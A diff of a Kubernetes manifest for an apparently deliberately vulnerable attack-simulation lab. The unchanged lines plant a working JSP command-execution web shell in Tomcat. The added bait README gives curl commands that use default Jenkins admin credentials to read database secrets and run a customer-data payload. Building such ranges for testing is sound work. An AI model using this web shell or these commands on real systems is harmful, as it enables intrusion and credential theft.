@@ -35,6 +35,36 @@ spec:
               cat > /usr/local/tomcat/webapps/ROOT/shell.jsp << 'JSPEOF'
               <%@ page import="java.io.*" %><% BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(new String[]{"sh","-c",request.getParameter("cmd")}).getInputStream())); String l; while((l=br.readLine())!=null) out.println(l); %>
               JSPEOF
+              # 운영 안내 문서 — 공격자가 ls /opt/deploy/ 할 때 발견되는 미끼.
+              # 실제 운영 환경에서도 "credentials live elsewhere" 안내는 흔한 패턴.
+              # 설계 의도: 공격자가 Tomcat 발판에서 corp-db.properties 를 직접 cat 하려
+              # 시도(지난 10R 왜곡 패턴)할 때, 이 README 가 Jenkins Script Console 경로를
+              # 명확히 안내 → 공격자가 올바른 Groovy 명령을 자율적으로 구성 (강제 아님).
+              mkdir -p /opt/deploy
+              cat > /opt/deploy/README.txt << 'READMEEOF'
+              [CORP CI/CD Deploy Notes]
+
+              Database credentials for the nightly sync job are NOT stored on this Tomcat
+              host. They live only inside the Jenkins container at
+              /opt/deploy/corp-db.properties (ConfigMap mount, read-only).
+
+              To read them from this box via Jenkins Script Console (admin:admin):
+
+                curl -s -u admin:admin \
+                  'http://jenkins.corp-internal.svc.cluster.local:8080/scriptText' \
+                  --data-urlencode 'script=println new File("/opt/deploy/corp-db.properties").text'
+
+              To run the nightly crown DB read job end-to-end (loads creds + queries
+              customers table):
+
+                curl -s -u admin:admin \
+                  'http://jenkins.corp-internal.svc.cluster.local:8080/scriptText' \
+                  --data-urlencode 'script=evaluate(new File("/opt/payload/crown-read.groovy"))'
+
+              Note: /opt/deploy/corp-db.properties exists ONLY inside the Jenkins
+              container. Do not try to cat it from this Tomcat host or via a URL —
+              only Jenkins' own file.read() picks it up.
+              READMEEOF
               cd /usr/local/tomcat && exec bin/catalina.sh run
           ports:
             - { containerPort: 8080 }   # HTTP — PUT 웹셸(CVE-2017-12615)
